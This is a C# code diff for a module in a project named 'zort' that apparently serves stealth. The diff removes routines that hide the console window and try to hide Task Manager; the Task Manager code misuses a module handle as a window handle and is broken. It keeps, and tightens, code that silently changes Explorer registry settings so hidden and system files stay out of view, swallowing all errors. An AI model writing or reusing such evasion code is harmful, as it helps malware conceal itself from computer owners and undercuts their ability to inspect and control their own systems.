@@ -16,8 +16,6 @@ namespace zort
 
         public void Start()
         {
-            HideConsole();
-            ModuleLogger.Log(this, "Console window is now hidden.");
             HideHiddenFoldersFromExplorer();
             ModuleLogger.Log(this, "Hidden files are now hidden from explorer.");
         }
@@ -25,27 +23,6 @@ namespace zort
         public void Stop()
         {
             // No need to stop anything
-        }
-
-        public static void HideConsole()
-        {
-
-            IntPtr consoleWindow = NativeMethods.GetConsoleWindow();
-            if (consoleWindow != IntPtr.Zero)
-            {
-                NativeMethods.ShowWindow(consoleWindow, NativeMethods.SW_HIDE);
-            }
-        }
-
-        public static void MinimizeTaskManager()
-        {
-            //get task manager window handle
-            IntPtr taskManagerHandle = NativeMethods.GetModuleHandle("Taskmgr.exe");
-            if (taskManagerHandle != IntPtr.Zero)
-            {
-                //minimize task manager window
-                NativeMethods.ShowWindow(taskManagerHandle, NativeMethods.SW_HIDE);
-            }
         }
 
         public static void HideHiddenFoldersFromExplorer()
@@ -56,14 +33,24 @@ namespace zort
 
                 if (explorerKey != null)
                 {
-                    explorerKey.SetValue("Hidden", 2, RegistryValueKind.DWord); // Hide hidden files
-                    explorerKey.SetValue("ShowSuperHidden", 0, RegistryValueKind.DWord); // Hide system files
+                    object hiddenValue = explorerKey.GetValue("Hidden");
+                    if (hiddenValue == null || Convert.ToInt32(hiddenValue) != 2)
+                    {
+                        explorerKey.SetValue("Hidden", 2, RegistryValueKind.DWord); // Hide hidden files
+                    }
+
+                    object showSuperHiddenValue = explorerKey.GetValue("ShowSuperHidden");
+                    if (showSuperHiddenValue == null || Convert.ToInt32(showSuperHiddenValue) != 0)
+                    {
+                        explorerKey.SetValue("ShowSuperHidden", 0, RegistryValueKind.DWord); // Hide system files
+                    }
+
                     explorerKey.Close();
                 }
             }
             catch
             {
-
+                // Handle exceptions silently
             }
         }
     }
